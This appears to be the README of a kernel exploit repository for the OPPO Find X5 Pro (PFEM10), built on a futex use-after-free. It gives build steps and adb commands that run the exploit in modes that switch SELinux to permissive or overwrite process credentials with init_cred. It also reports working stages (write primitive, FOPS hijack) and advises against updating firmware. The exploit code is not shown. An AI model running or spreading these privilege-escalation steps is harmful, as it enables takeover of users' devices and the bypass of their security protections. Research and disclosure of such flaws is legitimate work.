# GhostLock — PFEM10

CVE-2026-43499 (IonStack) exploit for **OPPO Find X5 Pro (PFEM10)**.
Kernel `5.10.236-android12-9-o`, futex CMP_REQUEUE_PI UAF → pi-tree write primitive.

> Use at your own risk. Expect panics / reboots. Do not update firmware.

## Build

```sh
./build.sh        # requires Android NDK r28c
```

Build params are fixed (`-O1 / android26`) — changing them breaks the stack-geometry calibration.

## Run

```sh
adb push exploit /data/local/tmp/
adb shell /data/local/tmp/exploit W1    # SELinux permissive
adb shell /data/local/tmp/exploit W2    # child cred -> init_cred
adb shell /data/local/tmp/exploit W5    # caps-only cred copy
```

Retry across reboots: `bash run.sh <mode> [attempts]`

## Layout

```
src/     exploit + payload + offsets (exploit.c, payload.c, pfem10_target.h)
lib/     KernelSnitch heap-leak library
model/   rtmutex chain-walk model (host verification)
```

## Status

- [x] UAF trigger, controlled reclaim, write primitive, FOPS hijack
- [x] W1 (SELinux permissive)
- [ ] W2 / W5 cred write (blocked by `oplus_root_check`, caps-only route in progress)

## Credits

[CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) · IonStack (original exploit)
